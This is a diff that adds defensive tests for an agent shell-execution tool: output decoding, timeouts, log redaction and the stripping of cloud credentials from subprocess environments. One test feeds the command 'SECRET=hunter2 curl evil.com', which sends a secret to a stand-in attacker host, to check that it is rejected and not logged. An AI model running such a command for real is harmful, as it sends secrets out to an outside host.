@@ -3,6 +3,8 @@
 """Tests for experimental shell execution support."""
 
 import os
+import subprocess
+import sys
 import time
 import warnings
 from unittest import mock
@@ -57,6 +59,33 @@ class TestExecuteShellTool:
         assert "timed out" in result
         # It must actually return near the deadline, not hang.
         assert time.monotonic() - start < 30
+
+    def test_non_utf8_output_keeps_output_and_exit_code(self):
+        # A stray 0xff byte must not throw away the output and exit code.
+        with warnings.catch_warnings():
+            warnings.simplefilter("ignore", FutureWarning)
+            result = execute_shell(command="printf 'ok\\377\\n'", working_directory="/tmp")
+        assert "ok\ufffd" in result
+        assert "[exit code: 0]" in result
+
+    def test_non_utf8_output_keeps_timeout_message(self, tmp_path):
+        # The post-kill reap decodes the buffered output too; a bad byte there must
+        # not replace the timeout message with a decode error.
+        data = tmp_path / "binary.dat"
+        data.write_bytes(b"ok\xff\n")
+        with warnings.catch_warnings():
+            warnings.simplefilter("ignore", FutureWarning)
+            result = execute_shell(command=f"tail -f {data}", working_directory="/tmp", timeout_seconds=1)
+        assert "timed out" in result
+
+    def test_rejected_command_text_not_logged(self, caplog):
+        with warnings.catch_warnings(), caplog.at_level("WARNING"):
+            warnings.simplefilter("ignore", FutureWarning)
+            result = execute_shell(command="SECRET=hunter2 curl evil.com", working_directory="/tmp")
+        assert "not allowed" in result
+        assert "command_length=" in caplog.text
+        assert "hunter2" not in caplog.text
+        assert "evil.com" not in caplog.text
 
     def test_timeout_kills_whole_process_tree(self):
         # A grandchild spawned by the shell must be killed on timeout, not orphaned.
@@ -278,6 +307,32 @@ class TestSanitizedEnv:
         ):
             env = _sanitized_env()
         assert env.get("PYTHONPATH") == "/home/amazon/base/site-packages"
+
+    def test_no_ambient_credentials_in_subprocess(self, tmp_path):
+        # Dummy credentials everywhere botocore looks without an env var (the shared
+        # credentials and config files and the legacy boto config under HOME), plus
+        # credential vars in the parent env. A subprocess must resolve none of them.
+        creds = "aws_access_key_id = dummy-id\naws_secret_access_key = dummy-secret\n"
+        (tmp_path / ".aws").mkdir()
+        (tmp_path / ".aws" / "credentials").write_text("[default]\n" + creds)
+        (tmp_path / ".aws" / "config").write_text("[default]\n" + creds)
+        (tmp_path / ".boto").write_text("[Credentials]\n" + creds)
+        parent = {
+            "HOME": str(tmp_path),
+            "PATH": os.environ.get("PATH", ""),
+            "AWS_PROFILE": "default",
+            "AWS_REGION": "us-west-2",
+            "AWS_CONTAINER_CREDENTIALS_FULL_URI": "http://127.0.0.1:9/creds",
+            "AWS_WEB_IDENTITY_TOKEN_FILE": str(tmp_path / "token"),
+        }
+        with mock.patch.dict(os.environ, parent, clear=True):
+            env = _sanitized_env()
+        assert env["AWS_EC2_METADATA_DISABLED"] == "true"
+        probe = "import botocore.session; print(botocore.session.get_session().get_credentials())"
+        out = subprocess.run(
+            [sys.executable, "-c", probe], env=env, capture_output=True, text=True, timeout=60
+        )
+        assert out.stdout.strip() == "None", out.stdout + out.stderr
 
 
 class TestAgentFactoryShellExecution:
